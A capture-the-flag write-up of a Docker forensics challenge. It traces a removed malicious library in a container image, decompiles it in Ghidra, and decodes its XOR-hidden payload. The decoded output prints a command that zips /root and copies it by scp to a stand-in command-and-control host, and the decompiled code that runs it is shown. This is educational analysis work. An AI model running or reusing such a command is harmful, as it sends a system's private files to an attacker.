## PROTECT THE SUPPLY

---

Hard | Linux, Forensics | 250 points

---

### Description

After the day that the A.I went rouge everything has changed in our society even simple and micro services have changed. Our Hacky University and our Hacky Factory has changed and something looks out of place...

Can you see why we no longer feel at home in our own container?

Get started:

```php
sudo docker run -ti hackazon/micro_ghost /bin/sh
```

Can you identify why ever since the attack our container felt off?

---

### First Impressions

Once we run our command, we end up in a docker container that looks like a typical linux system. However no amount of grep or strings finds us anything useful here. So I googled what sort of forensic tools exist for docker containers. I found a tool called dive which you can find more details of [https://gochronicles.com/dive/](https://gochronicles.com/dive/) here.

I used dive using the following command:

```php
sudo dive hackazon/micro_ghost
```

Once I did, I got a gui that shows us how the files in the container changed:

![dive](https://user-images.githubusercontent.com/74945479/181754131-7aea45ad-40ed-439a-a21e-79d9d70d978c.png)


 The final change was that a file called libc.so.evil.6 was removed from opt/ after being run. Seems strange. 

We can use docker commands to save our container into a tar file. 

```php
docker save --output hackazon/micro_ghost.tar hackazon/micro_ghost
```

Once we open our tar file, we see many folders with garble for names. But looking back in dive, we see that each of these folders corresponds to an image id. So if we navigate to any folder, we are able to see the files that changed in that image! Using this we can easily retrieve the libc.so.evil.6 and save it to our computer. 

We can try running the file but I don’t suggest you try that.. it is malware. 

Instead, we can examine libc.so.evil.6 in ghirda. When we do, we discover two functions.

```php
undefined8 FUN_0010124b(void)

{
  char sent2;
  undefined local_47;
  undefined local_46;
  undefined local_45;
  undefined local_44;
  undefined local_43;
  undefined local_42;
  undefined local_41;
  undefined local_40;
  undefined local_3f;
  undefined local_3e;
  undefined local_3d;
  undefined local_3c;
  undefined local_3b;
  undefined local_3a;
  undefined local_39;
  undefined local_38;
  undefined local_37;
  undefined local_36;
  undefined local_35;
  undefined local_34;
  char sent1;
  undefined local_27;
  undefined local_26;
  undefined local_25;
  undefined local_24;
  undefined local_23;
  undefined local_22;
  undefined local_21;
  undefined local_20;
  undefined local_1f;
  undefined local_1e;
  undefined local_1d;
  undefined local_1c;
  undefined local_1b;
  undefined local_1a;
  undefined local_19;
  undefined local_18;
  undefined local_17;
  undefined local_16;
  undefined local_15;
  undefined local_14;
  undefined local_13;
  char *local_10;
  
  somearray = (undefined *)malloc(0xa8);
  local_10 = 
  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaay aaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaa"
  ;
  sent1 = 'T';
  sent2 = 'R';
  local_46 = 0x61;
  local_25 = 0x61;
  local_45 = 0x6c;
  local_24 = 0x6c;
  local_1d = 0x20;
  local_3d = 0x41;
  local_1c = 0x41;
  local_3c = 0x20;
  somearray[0x9b] = 0x40;
  somearray[0x9c] = 0x54;
  somearray[0x9d] = 4;
  somearray[0x9e] = 2;
  somearray[0x9f] = 10;
  somearray[0xa0] = 0x1f;
  somearray[0xa1] = 0x41;
  somearray[0xa2] = 0x43;
  somearray[0xa3] = 0x25;
  somearray[0xa4] = 0x36;
  somearray[0xa5] = 0x43;
  somearray[0xa6] = 0x5a;
  somearray[0xa7] = 0;
  FUN_00101208();
  local_44 = 0x6c;
  local_41 = 0x4e;
  local_20 = 0x4e;
  local_40 = 0x6f;
  local_1f = 0x6f;
  local_3f = 0x74;
  local_1e = 0x74;
  local_3e = 0x20;
  local_27 = 0x6f;
  somearray[0x4d] = 0;
  somearray[0x4e] = 0xd;
  somearray[0x4f] = 5;
  somearray[0x50] = 0x1a;
  somearray[0x51] = 0xc;
  somearray[0x52] = 0;
  somearray[0x53] = 8;
  somearray[0x54] = 0x18;
  somearray[0x55] = 0x4f;
  somearray[0x56] = 5;
  somearray[0x57] = 4;
  somearray[0x58] = 0x1b;
  somearray[0x59] = 0x5b;
  somearray[0x5a] = 0x4e;
  somearray[0x5b] = 0x18;
  somearray[0x5c] = 0x1d;
  somearray[0x5d] = 4;
  somearray[0x5e] = 0x15;
  somearray[0x5f] = 0x3e;
  somearray[0x60] = 0x1d;
  somearray[0x61] = 0;
  somearray[0x62] = 0x15;
  somearray[99] = 0;
  somearray[100] = 0x55;
  somearray[0x65] = 0x5a;
  somearray[0x66] = 0x17;
  somearray[0x67] = 0x50;
  somearray[0x68] = 0x5f;
  somearray[0x69] = 0x43;
  somearray[0x6a] = 0x54;
  somearray[0x6b] = 10;
  somearray[0x6c] = 0x50;
  somearray[0x6d] = 0x3e;
  somearray[0x6e] = 0x54;
  somearray[0x6f] = 0x17;
  somearray[0x70] = 0x14;
  somearray[0x71] = 0x11;
  somearray[0x72] = 0x2d;
  somearray[0x73] = 0x1b;
  somearray[0x74] = 0x3a;
  somearray[0x75] = 0x43;
  somearray[0x76] = 0x5a;
  somearray[0x77] = 0x10;
  somearray[0x78] = 0xb;
  somearray[0x79] = 0x41;
  somearray[0x7a] = 4;
  somearray[0x7b] = 0x1a;
  somearray[0x7c] = 1;
  somearray[0x7d] = 0x4f;
  somearray[0x7e] = 0x1b;
  somearray[0x7f] = 0xb;
  somearray[0x80] = 0x18;
  somearray[0x81] = 0x5a;
  somearray[0x82] = 0x17;
  somearray[0x83] = 0x51;
  somearray[0x84] = 0x54;
  somearray[0x85] = 0x43;
  somearray[0x86] = 0x22;
  somearray[0x87] = 10;
  somearray[0x88] = 0x5e;
  somearray[0x89] = 0x50;
  somearray[0x8a] = 0xf;
  somearray[0x8b] = 0x3d;
  somearray[0x8c] = 0x5a;
  somearray[0x8d] = 0x54;
  local_47 = 0x65;
  local_26 = 0x74;
  local_23 = 0x6c;
  local_43 = 0x79;
  local_22 = 0x79;
  local_42 = 0x20;
  local_21 = 0x20;
  local_1b = 0x20;
  local_3b = 0x4d;
  somearray[0x8e] = 0x3e;
  somearray[0x8f] = 0x55;
  somearray[0x90] = 4;
  somearray[0x91] = 0x52;
  somearray[0x92] = 0x3e;
  somearray[0x93] = 0x29;
  somearray[0x94] = 0x4e;
  somearray[0x95] = 0x38;
  somearray[0x96] = 0x40;
  somearray[0x97] = 0x43;
  somearray[0x98] = 0x4f;
  somearray[0x99] = 0x40;
  somearray[0x9a] = 0x1c;
  local_1a = 0x4d;
  local_3a = 0x61;
  local_19 = 0x61;
  local_39 = 0x6c;
  local_18 = 0x6c;
  local_38 = 0x77;
  FUN_001011f2();
  local_17 = 0x77;
  local_37 = 0x61;
  local_16 = 0x61;
  *somearray = 4;
  somearray[1] = 2;
  somearray[2] = 9;
  somearray[3] = 0xe;
  somearray[4] = 0x42;
  somearray[5] = 0x43;
  somearray[6] = 0x2f;
  somearray[7] = 0xe;
  somearray[8] = 0x13;
  somearray[9] = 4;
  somearray[10] = 0x43;
  somearray[0xb] = 0x5a;
  somearray[0xc] = 0x12;
  somearray[0xd] = 0x50;
  somearray[0xe] = 0x5c;
  somearray[0xf] = 0x43;
  somearray[0x10] = 0x26;
  somearray[0x11] = 0x35;
  somearray[0x12] = 0x27;
  somearray[0x13] = 0x1a;
  somearray[0x14] = 0x25;
  somearray[0x15] = 0x51;
  somearray[0x16] = 0xf;
  somearray[0x17] = 0x56;
  somearray[0x18] = 0x15;
  somearray[0x19] = 0x51;
  somearray[0x1a] = 0x2d;
  somearray[0x1b] = 0xd;
  somearray[0x1c] = 0x59;
  somearray[0x1d] = 0x2f;
  somearray[0x1e] = 0x26;
  somearray[0x1f] = 0x3e;
  somearray[0x20] = 0x4b;
  somearray[0x21] = 0x5a;
  somearray[0x22] = 0x1b;
  somearray[0x23] = 8;
  somearray[0x24] = 0x1a;
  somearray[0x25] = 0x41;
  somearray[0x26] = 0x4c;
  somearray[0x27] = 0x13;
  somearray[0x28] = 0x4b;
  somearray[0x29] = 4;
  somearray[0x2a] = 0x19;
  somearray[0x2b] = 7;
  somearray[0x2c] = 0x42;
  somearray[0x2d] = 0x1b;
  somearray[0x2e] = 8;
  somearray[0x2f] = 0x11;
  somearray[0x30] = 0x4d;
  somearray[0x31] = 0x4e;
  somearray[0x32] = 0x13;
  somearray[0x33] = 0xe;
  somearray[0x34] = 1;
  somearray[0x35] = 0x15;
  somearray[0x36] = 0x4e;
  somearray[0x37] = 0x5a;
  somearray[0x38] = 0x1c;
  somearray[0x39] = 2;
  somearray[0x3a] = 0x11;
  somearray[0x3b] = 0x41;
  somearray[0x3c] = 0x15;
  somearray[0x3d] = 0x19;
  somearray[0x3e] = 7;
  somearray[0x3f] = 0x4f;
  somearray[0x40] = 0xb;
  somearray[0x41] = 8;
  somearray[0x42] = 0x11;
  somearray[0x43] = 0x41;
  somearray[0x44] = 0;
  somearray[0x45] = 0xe;
  somearray[0x46] = 0xe;
  somearray[0x47] = 0x15;
  somearray[0x48] = 0x33;
  somearray[0x49] = 2;
  somearray[0x4a] = 0x53;
  somearray[0x4b] = 0x4f;
  somearray[0x4c] = 0x19;
  local_36 = 0x72;
  local_15 = 0x72;
  local_35 = 0x65;
  local_14 = 0x65;
  local_34 = 0;
  local_13 = 0;
  puts(&sent1);
  puts(&sent2);
  FUN_00101169(local_10,&sent1);
  return 0;
}
```

```php
void FUN_00101169(char *param_1)

{
  char *__command;
  size_t sVar1;
  int local_1c;
  
  __command = (char *)malloc(0xa8);
  local_1c = 0;
  while( true ) {
    sVar1 = strlen(param_1);
    if (sVar1 <= (ulong)(long)local_1c) break;
    __command[local_1c] = param_1[local_1c] ^ *(byte *)(local_1c + somearray);
    local_1c = local_1c + 1;
  }
  system(__command);
  return;
}
```

The first function seems to act as a set-up function by defining a global array with each index being equal to a hexadecimal value and passing the second function a seemingly random string. The second function then uses these and some local variables to make a command that gets executed by the system. We can reconstruct these functions in C.
You can find my script in reverse.c in this github. When I run my script I get the following output:

```php
└─$ ./a.out 
echo "Nope";v1="CTF{C0n7r0Ll1NG_";zip -r exf.zip /root/;scp exf.zip root@c2.maldomain.del:/yeet_data/;v2="5h3_5uppLy_";rm exf.zip;v3="Ch41n_15_7h3_K#Y!!!!}";echo "GG";
```

revealing that our key is CTF{C0n7r0Ll1NG_5h3_5uppLy_Ch41n_15_7h3_K#Y!!!!}
